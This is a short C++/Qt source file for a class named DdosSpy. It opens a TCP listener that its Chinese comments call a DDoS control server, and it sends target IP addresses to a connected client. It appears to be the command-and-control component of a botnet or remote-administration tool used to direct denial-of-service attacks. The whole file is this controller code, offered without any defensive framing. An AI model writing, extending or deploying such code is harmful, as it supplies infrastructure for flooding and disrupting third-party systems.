#include "ddosspy.h"

DdosSpy::DdosSpy(QWidget *parent) :
    QWidget(parent), mSock(0)

{
}

int DdosSpy::startDdosSpyServer(QString userName)
{

    // 开启新的服务端
    mServer = new TcpServer(this);
    connect(mServer,SIGNAL(newConnection(QTcpSocket*)), this,SLOT(newConnection(QTcpSocket*)));

    mServer->start(0);
    if (!mServer->server()->isListening()) {
        qDebug() << "开启DDOS控制服务端失败";
        deleteLater();
        return -1;
    }

    return mServer->server()->serverPort();
}

void DdosSpy::sendCommand(QString IP)
{
    if (mSock) {
        IP.append(CmdEnd);
        mSock->write(IP.toLocal8Bit());
    }
}


